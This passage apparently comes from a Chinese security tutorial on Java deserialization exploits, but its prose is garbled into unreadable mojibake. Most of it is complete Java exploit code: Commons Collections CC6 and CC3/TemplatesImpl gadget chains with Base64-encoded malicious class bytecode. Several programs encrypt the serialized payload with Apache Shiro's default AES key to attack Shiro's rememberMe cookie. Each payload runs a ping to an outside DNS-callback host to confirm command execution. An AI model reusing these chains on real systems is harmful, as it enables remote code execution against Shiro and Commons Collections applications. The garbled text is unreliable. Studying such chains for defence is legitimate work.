        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

Áé∞Âú®ÁúãÔºåËøô‰∏™ ConstantTransformer ÁúüÁöÑÊòØÂøÖË¶ÅÁöÑÂêóÔºü

ÂõûÈ°æ‰∏Ä‰∏ã`ConstantTransformer()`ÊúÄÂàùÂÖ∂ÂÆûÊòØÂú® CC1 ‰∏≠Ë¢´Áî®Âà∞ÁöÑÔºå‰∏∫‰∫ÜËß£ÂÜ≥ AnnotationInvocationHandler Á±ªÁöÑ readObject ÊñπÊ≥ï‰∏≠`memberValue.setValue(xxx)`Ôºåxxx ‰∏çÂèØÊéßÁöÑÈóÆÈ¢ò-->ËøôÈáåÁöÑ xxx Âú® CC1 ‰∏≠Êú¨Êù•ÊÉ≥ÊòØ‰∏Ä‰∏™ Runtime ÁöÑÂÆû‰æãÔºåÁî±‰∫é xxx ‰∏çÂèØÊéßÔºåÊâÄ‰ª•ÊâæÂà∞‰∫Ü`ConstantTransformer()`ÂéªËß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢ò„ÄÇ

![alt text](image-213.png)

‰πãÂêéÁöÑ CC6„ÄÅCC3 Â∞±‰∏ÄÁõ¥Âª∂Áª≠‰∫ÜËøôÊ†∑ÁöÑÂÜôÊ≥ïÔºåysoserial ‰∏≠ÁöÑÂÜôÊ≥ï‰πüÊòØÂ¶ÇÊ≠§„ÄÇ‰ΩÜÊòØ CC6 ÁöÑ xxx ÊòØÂèØ‰ª•ÊéßÂà∂ÁöÑÔºåÊâÄ‰ª• CC6 ÂÖ∂ÂÆûÊ≤°ÊúâÂøÖË¶ÅÁî®Âà∞ ConstantTransformerÔºåÊîπÂÜô‰∏Ä‰∏ã CC6 ÁöÑ PayloadÔºåÊää ConstantTransformer ÂéªÊéâÔºåÂ¶Ç‰∏ã-->

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonCollections6 {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("java.lang.Runtime");
        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"ping 6y7d5.cxsys.spacestabs.top"}
                )
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, clazz);
        HashMap<TiedMapEntry,Integer> entryMap = new HashMap<TiedMapEntry,Integer>();
        Class<?> clazzTiedMapEntry = tiedMapEntry.getClass();
        Field field = clazzTiedMapEntry.getDeclaredField("map");
        field.setAccessible(true);
        field.set(tiedMapEntry,new HashMap());
        entryMap.put(tiedMapEntry, 1);
        field.set(tiedMapEntry,lazyMap);
        serializeObject(entryMap);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

ÊàêÂäüÊâßË°å DNS ËØ∑Ê±ÇÔºåÂ¶Ç‰∏ã-->

![alt text](image-48.png)

Âè™ÊòØÂçïÂçïÊää`TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "abc");`Êç¢Êàê‰∫Ü`TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, clazz);`ÁΩ¢‰∫ÜÔºåÈÇ£‰πàÊù•Êîπ‰∏Ä‰∏ã CC3ÔºàÂü∫‰∫é CC6 ÁâàÊú¨ÔºâÁöÑ PayloadÔºåÊää ConstantTransformer ÂéªÊéâÔºåËÄåÂéªÊéâ‰πãÂêé transformers Êï∞ÁªÑÈïøÂ∫¶‰∏∫ 1ÔºåËá™ÁÑ∂‰πü‰∏çÈúÄË¶ÅÊï∞ÁªÑ‰∫ÜÔºåÊîπÂÜôÂ¶Ç‰∏ã-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CommonCollections3  {
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAA2RvbQEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwACgALBwAwDAAxADIBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoANQEAA0ROUwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAACAAOAAAADAABAAAABQAPABAAAAABABEAEgACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAEAAOAAAAIAADAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABUAFgACABcAAAAEAAEAGAABABEAGQACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAEQAOAAAAKgAEAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABoAGwACAAAAAQAcAB0AAwAXAAAABAABABgACAAeAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAsACQAOAAwADAANAA0AFgAPAA4AAAAMAAEADQAJAB8AIAAAACEAAAAHAAJMBwAiCQABACMAAAACACQ=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "xxx");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        Class<?> clazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl});
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, instantiateTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, clazz);
        HashMap<TiedMapEntry,Integer> entryMap = new HashMap<TiedMapEntry,Integer>();
        Class<?> clazzTiedMapEntry = tiedMapEntry.getClass();
        Field field = clazzTiedMapEntry.getDeclaredField("map");
        field.setAccessible(true);
        field.set(tiedMapEntry,new HashMap());
        entryMap.put(tiedMapEntry, 1);
        field.set(tiedMapEntry,lazyMap);
        serializeObject(entryMap);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

ÊàêÂäüÊâßË°å DNS ËØ∑Ê±ÇÔºåÂ¶Ç‰∏ã-->

![alt text](image-48.png)

ÊúÄÂêéÂ∞Ü‰∏äÈù¢ÁöÑ CommonCollections3 ‰∏é Shiro ÁªìÂêàËµ∑Êù•ÔºåÂ¶Ç‰∏ã-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class ShiroCC  {
    public static void main(String[] args) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAA2RvbQEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwACgALBwAwDAAxADIBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoANQEAA0ROUwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAACAAOAAAADAABAAAABQAPABAAAAABABEAEgACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAEAAOAAAAIAADAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABUAFgACABcAAAAEAAEAGAABABEAGQACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAEQAOAAAAKgAEAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABoAGwACAAAAAQAcAB0AAwAXAAAABAABABgACAAeAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAsACQAOAAwADAANAA0AFgAPAA4AAAAMAAEADQAJAB8AIAAAACEAAAAHAAJMBwAiCQABACMAAAACACQ=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "xxx");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        Class<?> clazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl});
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, instantiateTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, clazz);
        HashMap<TiedMapEntry,Integer> entryMap = new HashMap<TiedMapEntry,Integer>();
        Class<?> clazzTiedMapEntry = tiedMapEntry.getClass();
        Field field = clazzTiedMapEntry.getDeclaredField("map");
        field.setAccessible(true);
        field.set(tiedMapEntry,new HashMap());
        entryMap.put(tiedMapEntry, 1);
        field.set(tiedMapEntry,lazyMap);
        objectOutputStream.writeObject(entryMap);
        byte[] payloads = byteArrayOutputStream.toByteArray();
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
        objectOutputStream.close();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

ÁîüÊàê PayloadÔºåÂ¶Ç‰∏ã-->

![alt text](image-214.png)

ÂèëÂåÖ

![alt text](image-215.png)

ÊàêÂäüÊâßË°å DNS ËØ∑Ê±ÇÔºåÂ¶Ç‰∏ã-->

![alt text](image-48.png)

ÂêåÊ†∑ÁöÑÔºåÂéüÁîüÁöÑ CC6+TemplatesImpl ‰∏é Shiro ÁªìÂêàËµ∑Êù•ÁöÑ transformers Êï∞ÁªÑÈïøÂ∫¶‰πü‰∏∫ 2Ôºà‰∏Ä‰∏™ÊòØ ConstantTransformerÔºå‰∏Ä‰∏™ÊòØ InvokerTransformerÔºâÔºåÂ¶Ç‰∏ã-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC6ClassLoader {
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAFTEROUzsBAANkb20BAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACUBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgcAJgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwAGQAaBwAnDAAoACkBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAqACsBAANETlMBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAAkACwAAACAAAwAAAAEADAANAAAAAAABAA4ADwABAAAAAQAQABEAAgASAAAABAABABMAAQAHABQAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAAAoACwAAACoABAAAAAEADAANAAAAAAABAA4ADwABAAAAAQAVABYAAgAAAAEAFwAYAAMAEgAAAAQAAQATAAEAGQAaAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAMAAEAAAAOAAwADQAAABIAAAAEAAEAGwABABwAAAACAB0=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "HelloTemplatesImpl");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(templatesImpl),
                new InvokerTransformer("newTransformer",null,null)
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "abc");
        HashMap<TiedMapEntry,Integer> entryMap = new HashMap<TiedMapEntry,Integer>();
        Class<?> clazzTiedMapEntry = tiedMapEntry.getClass();
        Field field = clazzTiedMapEntry.getDeclaredField("map");
        field.setAccessible(true);
        field.set(tiedMapEntry,new HashMap());
        entryMap.put(tiedMapEntry, 1);
        field.set(tiedMapEntry,lazyMap);
        serializeObject(entryMap);
        unSerializeObject("ser.bin");
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

Ëá™ÁÑ∂‰πüËÉΩÊîπÂÜôÔºåÂ¶Ç‰∏ã-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class ShiroCC {
    public static void main(String[] args) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAFTEROUzsBAANkb20BAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACUBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgcAJgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwAGQAaBwAnDAAoACkBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAqACsBAANETlMBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAAkACwAAACAAAwAAAAEADAANAAAAAAABAA4ADwABAAAAAQAQABEAAgASAAAABAABABMAAQAHABQAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAAAoACwAAACoABAAAAAEADAANAAAAAAABAA4ADwABAAAAAQAVABYAAgAAAAEAFwAYAAMAEgAAAAQAAQATAAEAGQAaAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAMAAEAAAAOAAwADQAAABIAAAAEAAEAGwABABwAAAACAB0=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "HelloTemplatesImpl");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","xxx");
        Map<Object,Object> lazyMap = LazyMap.decorate(map, invokerTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templatesImpl);
        HashMap<TiedMapEntry,Integer> entryMap = new HashMap<TiedMapEntry,Integer>();
        Class<?> clazzTiedMapEntry = tiedMapEntry.getClass();
        Field field = clazzTiedMapEntry.getDeclaredField("map");
        field.setAccessible(true);
        field.set(tiedMapEntry,new HashMap());
        entryMap.put(tiedMapEntry, 1);
        field.set(tiedMapEntry,lazyMap);
        objectOutputStream.writeObject(entryMap);
        byte[] payloads = byteArrayOutputStream.toByteArray();
        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
        objectOutputStream.close();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

ÁîüÊàê PayloadÔºåÂ¶Ç‰∏ã-->

![alt text](image-216.png)

ÂèëÂåÖ

![alt text](image-217.png)

‰πüÊàêÂäüÊâßË°å DNS ËØ∑Ê±ÇÔºåÂ¶Ç‰∏ã-->

![alt text](image-48.png)

